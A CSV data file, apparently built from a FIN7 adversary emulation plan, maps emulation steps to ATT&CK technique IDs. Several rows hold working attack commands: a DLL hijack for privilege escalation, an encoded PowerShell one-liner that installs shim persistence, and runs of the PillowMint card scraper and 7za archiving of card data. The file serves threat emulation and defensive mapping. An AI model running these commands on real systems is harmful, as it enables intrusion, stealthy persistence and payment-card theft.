org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
fin7,fin7,unknown,fin7::11,11,Privilege Escalation,"id: ab48e12f-def0-40a4-b3d9-ad958f45202a | name: Privilege Escalation | description: Perform DLL hijack to escalate privileges. | tactic: Hijack Execution Flow - DLL Search Order Hijacking | technique: attack_id: T1574.001 | name: Hijack Execution Flow - DLL Search Order Hijacking | cti_source: https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html | procedure_group: procedure_priv_escalation | procedure_step: 7.A | platforms: windows: cmd: command: robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
cmd.exe /c ""C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe""
 | payloads: BOOSTWRITE.dll | executors: name: powershell | command: robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
cmd.exe /c ""C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe""
","[""T1574.001""]","[""T1574""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::12,12,Hijack Execution Flow - DLL Search Order Hijacking,attack_id: T1574.001 | name: Hijack Execution Flow - DLL Search Order Hijacking,"[""T1574.001""]","[""T1574""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::13,13,Setup Application Shim Persistence,"id: eb99abcb-93e2-4a3e-bf05-a484839dc851 | name: Setup Application Shim Persistence | description: Execute PowerShell oneliner to install application shim. | tactic: Defense Evasion | technique: attack_id: T1027 | name: Obfuscated Files or Information | cti_source: https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html | procedure_group: procedure_def_evasion | procedure_step: 9.B | platforms: windows: psh,pwsh: command: powershell.exe -noprofile -encodedCommand ""JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==""
 | executors: name: powershell | command: powershell.exe -noprofile -encodedCommand ""JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==""
","[""T1027""]","[""T1027""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::14,14,Obfuscated Files or Information,attack_id: T1027 | name: Obfuscated Files or Information,"[""T1027""]","[""T1027""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::15,15,Execute Application Shim Persistence,"id: 6ec6561b-e535-4fe3-9c20-a52e5982b513 | name: Execute Application Shim Persistence | description: Reboot the host to start shim persistence. | tactic: Persistence | technique: attack_id: T1546.011 | name: Application Shimming | cti_source: https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html | procedure_group: procedure_persistence | procedure_step: 10.A | platforms: windows: psh,pwsh: command: powershell.exe -c ""restart-computer -force""
 | executors: name: powershell | command: powershell.exe -c ""restart-computer -force""
","[""T1546.011""]","[""T1546""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::16,16,Application Shimming,attack_id: T1546.011 | name: Application Shimming,"[""T1546.011""]","[""T1546""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::17,17,Execute PillowMint Credit Card Scraper,"id: d04a02e1-a05c-46f8-adf0-c036266fe0a1 | name: Execute PillowMint Credit Card Scraper | description: Upload and execute the PillowMint credit card scraper as debug.exe | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf | procedure_group: procedure_discovery | procedure_step: 10.B.1 | platforms: windows: psh,pwsh: command: Move-Item pillowMint.exe debug.exe;
.\debug.exe;
 | payloads: pillowMint.exe | cleanup: Remove-Item -Force debug.exe;
 | executors: name: powershell | command: Move-Item pillowMint.exe debug.exe;
.\debug.exe;
 | cleanup_command: Remove-Item -Force debug.exe;
","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::18,18,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::19,19,Archive Credit Card Data,"id: 89b84389-036e-4c3d-a490-bf8ba50bffe8 | name: Archive Credit Card Data | description: Compress credit card data into an archive using 7za.exe | tactic: exfiltration | technique: attack_id: T1560.001 | name: Archive Collected Data: Archive via Utility | cti_source: https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/ | procedure_group: procedure_exfiltration | procedure_step: 10.B.2 | platforms: windows: psh,pwsh: command: .\7za.exe a log log.txt;
 | payloads: 7za.exe | cleanup: Remove-Item -Force log.7z;
 | executors: name: powershell | command: .\7za.exe a log log.txt;
 | cleanup_command: Remove-Item -Force log.7z;
","[""T1560.001""]","[""T1560""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
fin7,fin7,unknown,fin7::20,20,Archive Collected Data: Archive via Utility,attack_id: T1560.001 | name: Archive Collected Data: Archive via Utility,"[""T1560.001""]","[""T1560""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin7\Emulation_Plan\yaml\Fin7.yaml,yaml_regex_extract,high
